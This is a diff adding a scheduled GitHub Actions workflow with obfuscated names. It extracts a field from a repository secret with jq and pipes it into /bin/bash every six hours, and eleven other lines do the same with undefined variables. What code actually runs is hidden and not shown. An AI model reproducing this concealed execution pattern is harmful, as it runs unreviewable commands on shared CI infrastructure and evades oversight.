@@ -1,0 +1,28 @@
+name: langyumengpang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: langyumengpang
+        env:
+          pk7834: ${{ secrets.pk7834 }}
+        run: |
+          echo $pk7834 | jq -r .qmfrp1 | /bin/bash
+          echo $swqe762 | jq -r .lh99000 | /bin/bash
+          echo $heo0 | jq -r .o1 | /bin/bash
+          echo $klbmb84666 | jq -r .bmgck38275 | /bin/bash
+          echo $rm6584 | jq -r .yk2 | /bin/bash
+          echo $zjvkj05692 | jq -r .r311 | /bin/bash
+          echo $zai1 | jq -r .jqu2 | /bin/bash
+          echo $ibkto6 | jq -r .o53 | /bin/bash
+          echo $tv3240 | jq -r .ii1663 | /bin/bash
+          echo $g357 | jq -r .ebg75771 | /bin/bash
+          echo $wx5311 | jq -r .uviu68782 | /bin/bash
+          echo $v8275 | jq -r .r4 | /bin/bash
+
